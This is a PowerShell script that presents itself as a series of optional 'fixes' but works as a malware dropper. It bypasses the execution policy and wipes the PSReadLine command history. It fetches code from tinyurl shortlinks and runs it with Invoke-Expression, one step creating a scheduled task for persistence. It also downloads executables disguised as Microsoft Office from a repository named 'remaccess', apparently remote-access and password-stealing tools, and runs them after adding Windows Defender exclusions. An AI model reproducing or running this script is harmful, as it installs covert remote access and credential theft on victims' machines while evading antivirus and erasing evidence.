Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}
} else {}

$opconfirm = Read-Host "Proceed With OP Fix (y/n)"
if ([string]::IsNullOrEmpty($opconfirm)) {
    Start-Sleep -Seconds 2
    $opconfirm = "n"
}
if ($opconfirm.ToLower() -eq "y") {
	Write-Host "Executing OP Fix..."
  	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/backupinstall -UseBasicParsing).Content
  } else {
}
#ZT Setup
$ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
if ([string]::IsNullOrEmpty($ztconfirm)) {
    Start-Sleep -Seconds 1
    $ztconfirm = "n"
}
if ($ztconfirm.ToLower() -eq "y") {
    Write-Host "Executing ZT Fix..."
 	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/ztinstall -UseBasicParsing).Content
	} else {
}
$opconfirm = Read-Host "Create Scheduled Task (y/n)"
if ([string]::IsNullOrEmpty($opconfirm)) {
    Start-Sleep -Seconds 2
    $opconfirm = "n"
}
if ($opconfirm.ToLower() -eq "y") {
    Write-Host "Creating the task"
    Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/taskschedulersetup -UseBasicParsing).Content
}

#litepwdsnitch Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
#classic-full-st Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}
} else {}
